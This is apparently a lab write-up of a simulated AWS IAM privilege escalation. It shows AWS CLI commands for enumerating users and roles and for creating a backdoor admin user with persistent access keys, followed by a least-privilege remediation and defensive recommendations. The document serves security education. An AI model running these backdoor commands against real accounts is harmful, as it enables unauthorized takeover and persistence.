# ☁️ Cloud Privilege Escalation Simulation — AWS IAM

> **Topic:** Cloud Security & Identity Access Management (IAM)  
> **Platform:** Amazon Web Services (AWS)  
> **Tools:** AWS Console · AWS CLI · Kali Linux

---

## 📌 Overview

This project simulates a real-world **AWS IAM privilege escalation attack** — from initial misconfiguration through exploitation to full remediation. It demonstrates how a single overly permissive policy can lead to complete account compromise in under 3 minutes, and how least-privilege principles can fully close the attack path.

---

## 🎯 Objectives

- Create an intentionally misconfigured IAM user with `AdministratorAccess`
- Exploit the misconfiguration via the AWS CLI to perform privilege escalation
- Remediate the vulnerability using a scoped least-privilege policy
- Verify all escalation paths are blocked after the fix

---

## 🛠️ Tools & Environment

| Component | Details |
|---|---|
| Cloud Platform | Amazon Web Services (AWS) |
| Attack Machine | Kali Linux |
| CLI Tool | AWS CLI v2 |
| Vulnerable User | `vulnerable-user` |
| Backdoor User | `backdoor-admin` (created during attack, deleted post-demo) |
| Misconfigured Policy | `AdministratorAccess` (AWS Managed) |
| Fixed Policy | `LeastPrivilege-ReadOnly-Policy` (Custom) |

---

## ⚠️ The Vulnerability

The `vulnerable-user` account was assigned `AdministratorAccess` — an AWS managed policy with a wildcard permission statement:

```json
{
    "Effect"   : "Allow",
    "Action"   : "*",
    "Resource" : "*"
}
```

This grants unrestricted access to every AWS service and resource, including the ability to create and modify other IAM identities.

---

## 💥 Attack Walkthrough

### Phase 1 — Reconnaissance
```bash
aws sts get-caller-identity                                          # Confirm identity
aws iam list-users                                                   # Enumerate all IAM users
aws iam list-attached-user-policies --user-name vulnerable-user     # Check own permissions
aws iam list-roles                                                   # Enumerate all roles
```

### Phase 2 — Privilege Escalation (Backdoor Creation)
```bash
# Create a hidden admin account
aws iam create-user --user-name backdoor-admin

# Grant it full admin access
aws iam attach-user-policy \
    --user-name backdoor-admin \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Generate persistent credentials for the backdoor
aws iam create-access-key --user-name backdoor-admin
```
> Full account takeover achieved in **~3 minutes** from initial CLI access.

### Phase 3 — Blast Radius
```bash
aws s3 ls                                          # All storage buckets exposed
aws ec2 describe-instances --region us-east-1     # Full infrastructure enumeration
```

---

## 🔒 Remediation — Least Privilege Fix

The `AdministratorAccess` policy was removed and replaced with a scoped custom policy:

```json
{
    "Version"   : "2012-10-17",
    "Statement" : [
        {
            "Sid"      : "LeastPrivilegePolicy",
            "Effect"   : "Allow",
            "Action"   : ["s3:GetObject", "s3:ListBucket"],
            "Resource" : ["arn:aws:s3:::*"]
        }
    ]
}
```

**Policy name:** `LeastPrivilege-ReadOnly-Policy`

---

## ✅ Verification — Before vs After

| Action | Before Fix | After Fix |
|---|---|---|
| `iam:CreateUser` | ✅ Allowed | ❌ Denied |
| `iam:AttachUserPolicy` | ✅ Allowed | ❌ Denied |
| `iam:ListUsers` | ✅ Allowed | ❌ Denied |
| `iam:ListRoles` | ✅ Allowed | ❌ Denied |
| `iam:CreateAccessKey` | ✅ Allowed | ❌ Denied |
| `ec2:DescribeInstances` | ✅ Allowed | ❌ Denied |
| `s3:GetObject` | ✅ Allowed | ✅ Allowed |

All escalation commands returned `AccessDenied` after applying the fix.

---

## 📖 Key Takeaways

- A wildcard IAM policy enables **full account takeover in minutes**
- Attackers use **backdoor accounts** to maintain persistence after the original breach is detected
- **Least privilege** completely eliminates the escalation path with no complex tooling required
- AWS CLI access without MFA is a critical attack surface that must be monitored

---

## 🛡️ Recommendations

- Never assign `AdministratorAccess` to regular IAM users
- Enable **MFA** on all IAM users, especially those with programmatic access
- Enable **AWS CloudTrail** to log all IAM API calls
- Use **IAM Access Analyzer** to detect overly permissive policies
- Conduct regular **IAM access reviews** and rotate access keys periodically

---

## 📚 References

- [AWS IAM Security Best Practices](https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html)
- [MITRE ATT&CK T1078.004 — Valid Cloud Accounts](https://attack.mitre.org/techniques/T1078/004/)
- [MITRE ATT&CK T1098 — Account Manipulation](https://attack.mitre.org/techniques/T1098/)
- [Rhino Security Labs — AWS Privilege Escalation Methods](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [CIS AWS Foundations Benchmark](https://www.cisecurity.org/benchmark/amazon_web_services)

---

> ⚠️ **Disclaimer:** This simulation was performed in a personal AWS lab environment for educational purposes only. All resources were deleted after the exercise. Never perform these techniques on systems you do not own or have explicit permission to test.
